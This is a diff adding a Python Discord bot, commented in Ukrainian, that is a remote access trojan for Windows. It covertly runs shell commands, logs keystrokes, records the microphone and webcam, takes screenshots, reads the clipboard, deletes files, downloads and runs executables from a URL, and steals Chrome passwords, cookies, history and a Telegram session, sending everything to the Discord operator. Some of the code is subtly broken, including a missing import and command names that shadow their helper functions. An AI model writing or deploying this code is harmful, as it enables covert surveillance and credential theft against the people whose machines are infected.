@@ -1,0 +1,396 @@
+# bot_discord.py
+
+import os
+import sys
+import platform
+import socket
+import subprocess
+import tempfile
+import threading
+import shutil
+import sqlite3
+import wave
+import re
+
+import psutil
+import cv2
+import pyaudio
+import pyautogui
+import mss, mss.tools
+import keyboard
+import dns.resolver
+
+from discord import File
+from discord.ext import commands
+from dotenv import load_dotenv
+
+# ========== Налаштування ==========
+load_dotenv()
+TOKEN = os.getenv("DISCORD_TOKEN")
+PREFIX = "!"
+TMP    = tempfile.gettempdir()
+ID     = socket.gethostname() + "_" + str(os.getpid())
+
+bot = commands.Bot(command_prefix=PREFIX, intents=commands.Intents.all())
+
+# ========== 1. Системна інформація ==========
+def get_system_info():
+    info = [
+        f"Host: {socket.gethostname()}",
+        f"OS: {platform.system()} {platform.release()}",
+        f"Arch: {platform.machine()}",
+        f"CPU: {psutil.cpu_count(logical=True)} cores",
+        f"RAM: {round(psutil.virtual_memory().total/1e9,2)} GB",
+        f"IP: {socket.gethostbyname(socket.gethostname())}"
+    ]
+    return "\n".join(info)
+
+# ========== 2. Файловий менеджер ==========
+def list_dir(path="."):
+    try:
+        return "\n".join(os.listdir(path))
+    except Exception as e:
+        return f"Error: {e}"
+
+def change_dir(path):
+    try:
+        os.chdir(path)
+        return os.getcwd()
+    except Exception as e:
+        return f"Error: {e}"
+
+def delete_path(path):
+    try:
+        if os.path.isfile(path):
+            os.remove(path)
+        else:
+            shutil.rmtree(path)
+        return "Deleted"
+    except Exception as e:
+        return f"Error: {e}"
+
+def move_path(src, dst):
+    try:
+        os.rename(src, dst)
+        return "Moved"
+    except Exception as e:
+        return f"Error: {e}"
+
+def copy_path(src, dst):
+    try:
+        shutil.copy(src, dst)
+        return "Copied"
+    except Exception as e:
+        return f"Error: {e}"
+
+# ========== 3. Список процесів ==========
+def list_processes():
+    return subprocess.getoutput("tasklist")
+
+# ========== 4. Kill process ==========
+def kill_process(pid):
+    return subprocess.getoutput(f"taskkill /PID {pid} /F")
+
+# ========== 5. Shell-команди ==========
+def run_shell(cmd):
+    return subprocess.getoutput(cmd)
+
+# ========== 6. Скриншот ==========
+def take_screenshot():
+    path = os.path.join(TMP, f"{ID}_ss.png")
+    pyautogui.screenshot(path)
+    return path
+
+# ========== 7. Кейлогер ==========
+def start_keylogger(duration=10):
+    log = os.path.join(TMP, f"{ID}_keylog.txt")
+    def record():
+        with open(log, "a", encoding="utf-8") as f:
+            end = threading.Event()
+            def stopper():
+                end.wait(duration)
+                end.set()
+            threading.Thread(target=stopper, daemon=True).start()
+            while not end.is_set():
+                e = keyboard.read_event()
+                if e.event_type == keyboard.KEY_DOWN:
+                    f.write(e.name)
+    threading.Thread(target=record, daemon=True).start()
+    return log
+
+# ========== 8. Аудіо ==========
+def record_audio(seconds=5):
+    p = pyaudio.PyAudio()
+    stream = p.open(format=pyaudio.paInt16, channels=1,
+                    rate=44100, input=True, frames_per_buffer=1024)
+    frames = [stream.read(1024) for _ in range(int(44100/1024*seconds))]
+    stream.stop_stream(); stream.close(); p.terminate()
+    path = os.path.join(TMP, f"{ID}_au.wav")
+    wf = wave.open(path,"wb")
+    wf.setnchannels(1); wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
+    wf.setframerate(44100); wf.writeframes(b"".join(frames)); wf.close()
+    return path
+
+# ========== 9. Фото з камери ==========
+def take_photo():
+    cam = cv2.VideoCapture(0)
+    ret, frame = cam.read()
+    cam.release()
+    if not ret:
+        return None
+    path = os.path.join(TMP, f"{ID}_ph.jpg")
+    cv2.imwrite(path, frame)
+    return path
+
+# ========== 10. Live-стрім екрану ==========
+def live_screen(duration=5, fps=1):
+    files = []
+    with mss.mss() as sct:
+        for _ in range(duration*fps):
+            img = sct.grab(sct.monitors[1])
+            p = os.path.join(TMP, f"{ID}_ls_{int(time.time())}.png")
+            mss.tools.to_png(img.rgb, img.size, output=p)
+            files.append(p)
+            time.sleep(1/fps)
+    archive = os.path.join(TMP, f"{ID}_ls.zip")
+    shutil.make_archive(archive[:-4], 'zip', TMP, os.path.basename(files[0]))
+    for f in files: os.remove(f)
+    return archive
+
+# ========== 11. Буфер обміну ==========
+def get_clipboard():
+    try:
+        import ctypes
+        CF = 13
+        ctypes.windll.user32.OpenClipboard(0)
+        val = ctypes.windll.user32.GetClipboardData(CF)
+        text = ctypes.c_wchar_p(val).value
+        ctypes.windll.user32.CloseClipboard()
+        return text
+    except:
+        return ""
+
+# ========== 12. Автооновлення (скачати EXE) ==========
+def self_update(url):
+    import requests
+    r = requests.get(url)
+    path = os.path.join(TMP, "update.exe")
+    open(path,"wb").write(r.content)
+    subprocess.Popen([path], shell=True)
+    return "Updated"
+
+# ========== 13. Wi-Fi скан ==========
+def scan_wifi():
+    return subprocess.getoutput("netsh wlan show networks mode=Bssid")
+
+# ========== 14. Запуск .exe ==========
+def run_exe(path):
+    try:
+        subprocess.Popen(path, shell=True)
+        return "Launched"
+    except Exception as e:
+        return str(e)
+
+# ========== 15. Блокування ==========
+def lock_screen():
+    subprocess.call("rundll32.exe user32.dll,LockWorkStation", shell=True)
+
+# ========== 16. Перезавантаження/виключення ==========
+def shutdown():
+    subprocess.call("shutdown /s /t 0", shell=True)
+def reboot():
+    subprocess.call("shutdown /r /t 0", shell=True)
+
+# ========== 17–19. Browser stealer ==========
+def steal_chrome_passwords():
+    db = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
+    if not os.path.exists(db): return "No DB"
+    tmp = os.path.join(TMP,"ldb")
+    shutil.copy(db, tmp)
+    conn = sqlite3.connect(tmp); cur = conn.cursor()
+    out=[]
+    for origin, user, pwd in cur.execute(
+        "SELECT origin_url, username_value, password_value FROM logins"
+    ):
+        out.append(f"{origin}|{user}|{pwd.decode(errors='ignore')}")
+    conn.close(); os.remove(tmp)
+    return "\n".join(out) or "None"
+
+def steal_cookies():
+    db = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Cookies")
+    if not os.path.exists(db): return "No DB"
+    tmp = os.path.join(TMP,"cdb"); shutil.copy(db, tmp)
+    conn = sqlite3.connect(tmp); cur = conn.cursor()
+    out=[]
+    for name, val, host in cur.execute("SELECT name,value,host_key FROM cookies"):
+        out.append(f"{host}|{name}={val}")
+    conn.close(); os.remove(tmp)
+    return "\n".join(out) or "None"
+
+def steal_history():
+    db = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
+    if not os.path.exists(db): return "No DB"
+    tmp = os.path.join(TMP,"hdb"); shutil.copy(db, tmp)
+    conn = sqlite3.connect(tmp); cur = conn.cursor()
+    out=[]
+    for url, title, _ in cur.execute("SELECT url,title,last_visit_time FROM urls"):
+        out.append(f"{title}|{url}")
+    conn.close(); os.remove(tmp)
+    return "\n".join(out) or "None"
+
+# ========== 20. Telegram session stealer ==========
+def steal_tg_session(api_id, api_hash):
+    from telethon import TelegramClient
+    cli = TelegramClient(ID, api_id, api_hash)
+    cli.connect()
+    if not cli.is_user_authorized(): return "Not auth"
+    return open(f"{ID}.session","rb")
+
+# ========== Події та команди ==========
+
+@bot.event
+async def on_ready():
+    print(f"Logged in as {bot.user} (ID {bot.user.id})")
+
+# Системна інфо
+@bot.command()
+async def sysinfo(ctx):
+    await ctx.send(f"```{get_system_info()}```")
+
+# Файловий менеджер
+@bot.command()
+async def ls(ctx, *, path="."):
+    await ctx.send(f"```{list_dir(path)}```")
+
+@bot.command()
+async def cd(ctx, path):
+    res = change_dir(path)
+    await ctx.send(res)
+
+@bot.command()
+async def rm(ctx, *, path):
+    await ctx.send(delete_path(path))
+
+@bot.command()
+async def mv(ctx, src, dst):
+    await ctx.send(move_path(src, dst))
+
+@bot.command()
+async def cp(ctx, src, dst):
+    await ctx.send(copy_path(src, dst))
+
+# Процеси
+@bot.command()
+async def ps(ctx):
+    await ctx.send(f"```{list_processes()}```")
+
+@bot.command()
+async def kill(ctx, pid):
+    await ctx.send(kill_process(pid))
+
+# Shell
+@bot.command()
+async def shell(ctx, *, cmd):
+    await ctx.send(f"```{run_shell(cmd)}```")
+
+# Screenshot
+@bot.command()
+async def screenshot(ctx):
+    path = take_screenshot()
+    await ctx.send(file=File(path))
+    os.remove(path)
+
+# Keylogger
+@bot.command()
+async def keylog(ctx):
+    log = start_keylogger()
+    # зачекаємо 10 секунд
+    threading.Event().wait(10)
+    await ctx.send(file=File(log))
+    os.remove(log)
+
+# Audio
+@bot.command()
+async def audio(ctx, seconds: int = 5):
+    path = record_audio(seconds)
+    await ctx.send(file=File(path))
+    os.remove(path)
+
+# Photo
+@bot.command()
+async def photo(ctx):
+    path = take_photo()
+    if path:
+        await ctx.send(file=File(path))
+        os.remove(path)
+    else:
+        await ctx.send("Camera error")
+
+# Live screen
+@bot.command()
+async def livescreen(ctx, duration: int = 5):
+    path = live_screen(duration, fps=1)
+    await ctx.send(file=File(path))
+    os.remove(path)
+
+# Clipboard
+@bot.command()
+async def clip(ctx):
+    await ctx.send(f"```\n{get_clipboard()}\n```")
+
+# Self-update
+@bot.command()
+async def update(ctx, url):
+    await ctx.send(self_update(url))
+
+# Wifi
+@bot.command()
+async def wifi(ctx):
+    await ctx.send(f"```{scan_wifi()}```")
+
+# Run exe
+@bot.command()
+async def runexe(ctx, *, path):
+    await ctx.send(run_exe(path))
+
+# Lock / Shutdown / Reboot
+@bot.command()
+async def lock(ctx):
+    lock_screen(); await ctx.send("Locked")
+
+@bot.command()
+async def shutdown(ctx):
+    shutdown(); await ctx.send("Shutting down")
+
+@bot.command()
+async def reboot(ctx):
+    reboot(); await ctx.send("Rebooting")
+
+# Browser stealers
+@bot.command()
+async def pw(ctx):
+    await ctx.send(f"```{steal_chrome_passwords()}```")
+
+@bot.command()
+async def cookies(ctx):
+    await ctx.send(f"```{steal_cookies()}```")
+
+@bot.command()
+async def history(ctx):
+    await ctx.send(f"```{steal_history()}```")
+
+# Telegram session
+@bot.command()
+async def tgsession(ctx, api_id: int, api_hash: str):
+    file = steal_tg_session(api_id, api_hash)
+    await ctx.send(file=File(file))
+
+# Get link (self-update helper)
+@bot.command()
+async def getlink(ctx):
+    await ctx.send("Download URL: https://<your-server>/client_multi.exe")
+
+# Multi-client support & TLS — передбачені на рівні сервера Discord
+
+# ========== Запуск ==========
+bot.run(TOKEN)
